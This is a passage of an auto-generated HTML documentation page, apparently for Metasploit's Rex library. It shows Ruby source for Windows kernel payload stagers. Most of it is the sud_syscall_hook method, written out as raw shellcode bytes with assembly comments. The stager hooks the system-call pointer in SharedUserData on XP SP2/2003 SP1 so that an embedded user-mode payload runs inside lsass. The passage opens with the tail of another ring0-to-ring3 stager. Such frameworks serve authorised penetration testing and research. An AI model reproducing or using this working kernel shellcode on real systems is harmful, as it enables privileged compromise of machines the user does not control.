  <span class='id identifier rubyid_r0'>r0</span> <span class='op'>=</span> <span class='id identifier rubyid_r0'>r0</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span> <span class='lbracket'>[</span> <span class='int'>0x44444444</span> <span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='id identifier rubyid_checksum'>checksum</span> <span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='rparen'>)</span>
  <span class='id identifier rubyid_r0'>r0</span> <span class='op'>=</span> <span class='id identifier rubyid_r0'>r0</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span> <span class='lbracket'>[</span> <span class='int'>0x45454545</span> <span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='id identifier rubyid_pagetable'>pagetable</span> <span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='rparen'>)</span>

  <span class='comment'># Return the ring0 -&gt; ring3 payload blob with the real ring3 payload appended.
</span>  <span class='kw'>return</span> <span class='id identifier rubyid_r0'>r0</span> <span class='op'>+</span> <span class='id identifier rubyid_r3'>r3</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="sud_syscall_hook-class_method">
  
    .<strong>sud_syscall_hook</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>XP SP2/2K3 SP1 ONLY</p>

<p>Returns a kernel-mode stager that transitions from r0 to r3 by placing code in an unused portion of SharedUserData and then pointing the SystemCall attribute to that unused portion.  This has the effect of causing the custom code to be called every time a user-mode process tries to make a system call.  The returned payload also checks to make sure that it&#39;s running in the context of lsass before actually running the embedded payload.</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/rex/payloads/win32/kernel/stager.rb', line 93</span>

<span class='kw'>def</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_sud_syscall_hook'>sud_syscall_hook</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_r0_recovery'>r0_recovery</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>RecoveryStub</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='const'><span class='object_link'><a href="Recovery.html" title="Rex::Payloads::Win32::Kernel::Recovery (module)">Recovery</a></span></span><span class='period'>.</span><span class='id identifier rubyid_default'><span class='object_link'><a href="Recovery.html#default-class_method" title="Rex::Payloads::Win32::Kernel::Recovery.default (method)">default</a></span></span>
  <span class='id identifier rubyid_r3_payload'>r3_payload</span>  <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>UserModeStub</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
  <span class='id identifier rubyid_r3_prefix'>r3_prefix</span>   <span class='op'>=</span> <span class='id identifier rubyid__run_only_in_win32proc_stub'>_run_only_in_win32proc_stub</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xff\x25\x08\x03\xfe\x7f</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_r3_size'>r3_size</span>     <span class='op'>=</span> <span class='lparen'>(</span><span class='lparen'>(</span><span class='id identifier rubyid_r3_prefix'>r3_prefix</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>+</span> <span class='id identifier rubyid_r3_payload'>r3_payload</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>+</span> <span class='int'>3</span><span class='rparen'>)</span> <span class='op'>&amp;</span> <span class='op'>~</span><span class='int'>0x3</span><span class='rparen'>)</span> <span class='op'>/</span> <span class='int'>4</span>

  <span class='id identifier rubyid_r0_stager'>r0_stager</span> <span class='op'>=</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xEB</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='lbracket'>[</span><span class='int'>0x22</span> <span class='op'>+</span> <span class='id identifier rubyid_r0_recovery'>r0_recovery</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>C</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span> <span class='op'>+</span> <span class='comment'># jmp short 0x27
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xBB\x01\x03\xDF\xFF</span><span class='tstring_end'>&quot;</span></span>                         <span class='op'>+</span> <span class='comment'># mov ebx,0xffdf0301
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x4B</span><span class='tstring_end'>&quot;</span></span>                                         <span class='op'>+</span> <span class='comment'># dec ebx
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xFC</span><span class='tstring_end'>&quot;</span></span>                                         <span class='op'>+</span> <span class='comment'># cld
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8D\x7B\x7C</span><span class='tstring_end'>&quot;</span></span>                                 <span class='op'>+</span> <span class='comment'># lea edi,[ebx+0x7c]
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5E</span><span class='tstring_end'>&quot;</span></span>                                         <span class='op'>+</span> <span class='comment'># pop esi
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6A</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='lbracket'>[</span><span class='id identifier rubyid_r3_size'>r3_size</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>C</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>                   <span class='op'>+</span> <span class='comment'># push byte num_dwords
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x59</span><span class='tstring_end'>&quot;</span></span>                                         <span class='op'>+</span> <span class='comment'># pop ecx
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xF3\xA5</span><span class='tstring_end'>&quot;</span></span>                                     <span class='op'>+</span> <span class='comment'># rep movsd
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xBF\x7C\x03\xFE\x7F</span><span class='tstring_end'>&quot;</span></span>                         <span class='op'>+</span> <span class='comment'># mov edi,0x7ffe037c
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x39\x3B</span><span class='tstring_end'>&quot;</span></span>                                     <span class='op'>+</span> <span class='comment'># cmp [ebx],edi
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x74\x09</span><span class='tstring_end'>&quot;</span></span>                                     <span class='op'>+</span> <span class='comment'># jz
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x03</span><span class='tstring_end'>&quot;</span></span>                                     <span class='op'>+</span> <span class='comment'># mov eax,[ebx]
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8D\x4B\x08</span><span class='tstring_end'>&quot;</span></span>                                 <span class='op'>+</span> <span class='comment'># lea ecx,[ebx+0x8]
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x89\x01</span><span class='tstring_end'>&quot;</span></span>                                     <span class='op'>+</span> <span class='comment'># mov [ecx],eax
</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x89\x3B</span><span class='tstring_end'>&quot;</span></span>                                     <span class='op'>+</span> <span class='comment'># mov [ebx],edi
</span>    <span class='id identifier rubyid_r0_recovery'>r0_recovery</span> <span class='op'>+</span>
    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xe8</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='lbracket'>[</span><span class='int'>0xffffffd9</span> <span class='op'>-</span> <span class='id identifier rubyid_r0_recovery'>r0_recovery</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>V</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span> <span class='op'>+</span> <span class='comment'># call 0x2
</span>    <span class='id identifier rubyid_r3_prefix'>r3_prefix</span> <span class='op'>+</span>
    <span class='id identifier rubyid_r3_payload'>r3_payload</span>

  <span class='kw'>return</span> <span class='id identifier rubyid_r0_stager'>r0_stager</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
  </div>

</div>

      <div id="footer">
  Generated on Wed Mar 31 00:32:38 2021 by
  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
  0.9.26 (ruby-2.7.2).
</div>

    </div>
  </body>
</html>